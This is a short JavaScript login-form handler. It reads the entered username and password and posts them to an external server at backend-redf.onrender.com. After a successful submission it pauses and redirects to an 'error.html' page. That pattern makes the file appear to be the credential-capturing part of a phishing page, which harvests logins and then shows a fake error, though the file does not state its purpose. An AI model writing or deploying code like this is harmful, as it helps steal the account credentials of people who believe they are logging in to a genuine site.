document.getElementById("loginBtn").addEventListener("click", async function () {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const loginBtn = document.getElementById("loginBtn");

    if (!username || !password) {
        alert("Please enter both username and password.");
        return;
    }

    loginBtn.innerText = "Logging in...";
    loginBtn.disabled = true; // Disable button to prevent multiple clicks

    try {
        const response = await fetch("https://backend-redf.onrender.com/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, password }),
        });

        // Simulating delay for testing
        await new Promise(resolve => setTimeout(resolve, 2000)); 

        if (response.ok) {
            window.location.href = "error.html";
        } else {
            alert("Invalid login. Try again.");
        }
    } catch (error) {
        console.error("Error:", error);
        alert("Something went wrong! Please try again.");
    } finally {
        loginBtn.innerText = "Log In";
        loginBtn.disabled = false;
    }
});
